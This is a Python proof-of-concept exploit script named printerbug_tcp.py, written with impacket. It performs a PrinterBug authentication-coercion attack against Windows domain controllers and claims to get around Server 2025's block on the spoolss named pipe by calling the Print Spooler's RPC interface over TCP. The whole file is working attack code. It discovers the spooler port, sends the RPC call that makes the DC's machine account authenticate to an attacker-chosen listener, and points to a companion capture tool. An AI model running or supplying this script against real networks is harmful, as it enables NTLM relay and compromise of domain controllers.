#!/usr/bin/env python3
"""
printerbug_tcp.py — PrinterBug via TCP (Server 2025 pipe bypass)

Microsoft blocked \\pipe\\spoolss for remote access in Server 2025.
However, the Spooler service still listens on ncacn_ip_tcp (dynamic port).
RpcRemoteFindFirstPrinterChangeNotificationEx works via TCP and triggers
an outbound callback from the DC's machine account.

This PoC:
  1. Discovers the Spooler TCP port via EPM
  2. Binds to MS-RPRN via TCP
  3. Calls RpcRemoteFindFirstPrinterChangeNotificationEx
  4. DC calls back to listener:135 (EPM) with machine account NTLM auth

Usage:
  python3 printerbug_tcp.py -t TARGET -l LISTENER -u USER -p PASS -d DOMAIN
"""

import argparse
import sys
from impacket.dcerpc.v5 import transport, rprn, epm
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.uuid import uuidtup_to_bin


class DCERPCSessionError(DCERPCException):
    pass
sys.modules[__name__].DCERPCSessionError = DCERPCSessionError


RPRN_UUID = uuidtup_to_bin(('12345678-1234-ABCD-EF00-0123456789AB', '1.0'))


def find_spooler_port(target, username, password, domain):
    """Discover Spooler TCP port via rpcdump-style EPM lookup."""
    import struct, subprocess, re

    # Use rpcdump and find RPRN UUID (not NRPC which has similar UUID)
    # RPRN: 12345678-1234-ABCD-EF00-0123456789AB
    # NRPC: 12345678-1234-ABCD-EF00-01234567CFFB
    try:
        result = subprocess.run(
            ['rpcdump.py', f'{domain}/{username}:{password}@{target}'],
            capture_output=True, text=True, timeout=30)

        lines = result.stdout.split('\n')
        for i, line in enumerate(lines):
            # Match EXACT RPRN UUID (ends with 89AB, not CFFB)
            if '12345678-1234-ABCD-EF00-0123456789AB' in line.upper():
                # Search following lines for ncacn_ip_tcp binding
                for j in range(i+1, min(i+10, len(lines))):
                    if 'ncacn_ip_tcp' in lines[j]:
                        m = re.search(r'\[(\d+)\]', lines[j])
                        if m:
                            return int(m.group(1))
                    # Stop if we hit another UUID or Protocol
                    if lines[j].strip().startswith('UUID') or lines[j].strip().startswith('Protocol'):
                        break
    except:
        pass

    return None


def trigger(target, listener, username, password, domain, port):
    """Fire PrinterBug via TCP."""
    binding = f'ncacn_ip_tcp:{target}[{port}]'
    rpc = transport.DCERPCTransportFactory(binding)
    rpc.set_credentials(username, password, domain)
    rpc.set_connect_timeout(15)
    dce = rpc.get_dce_rpc()
    dce.set_auth_level(6)
    dce.connect()
    dce.bind(RPRN_UUID)

    resp = rprn.hRpcOpenPrinter(dce, f'\\\\{target}\x00')
    handle = resp['pHandle']

    try:
        rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
            dce, handle,
            fdwFlags=rprn.PRINTER_CHANGE_ADD_JOB,
            pszLocalMachine=f'\\\\{listener}\x00')
    except:
        pass

    try:
        rprn.hRpcClosePrinter(dce, handle)
    except:
        pass
    dce.disconnect()


def main():
    parser = argparse.ArgumentParser(
        description="PrinterBug via TCP — Server 2025 \\pipe\\spoolss bypass")
    parser.add_argument("-t", "--target",   required=True, help="Target DC IP")
    parser.add_argument("-l", "--listener", required=True, help="Listener IP (run epm_proxy.py there)")
    parser.add_argument("-u", "--username", required=True, help="Domain username")
    parser.add_argument("-p", "--password", default="",    help="Password")
    parser.add_argument("-d", "--domain",   required=True, help="Domain name")
    parser.add_argument("--port",           type=int, default=None, help="Spooler TCP port (auto-detect if omitted)")
    args = parser.parse_args()

    print(f"[*] PrinterBug via TCP — Server 2025 pipe bypass")
    print(f"[*] Target: {args.target} → Listener: {args.listener}\n")

    # Step 1: Find spooler TCP port
    if args.port:
        port = args.port
        print(f"[*] Using specified port: {port}")
    else:
        print(f"[*] Discovering Spooler TCP port via EPM...")
        port = find_spooler_port(args.target, args.username, args.password, args.domain)
        if not port:
            print(f"[-] Spooler not found on TCP. Is Print Spooler running?")
            return
        print(f"[+] Spooler found on TCP/{port}")

    # Step 2: Check pipe is blocked
    print(f"[*] Note: \\pipe\\spoolss is blocked on Server 2025")
    print(f"[*] Bypassing via ncacn_ip_tcp:{args.target}[{port}]\n")

    # Step 3: Fire
    print(f"[*] Triggering callback to {args.listener}:135...")
    trigger(args.target, args.listener, args.username, args.password, args.domain, port)
    print(f"[+] Done — DC should callback to {args.listener}:135")
    print(f"[*] Capture with: sudo python3 epm_proxy.py -dc {args.target} -l {args.listener}")


if __name__ == "__main__":
    main()
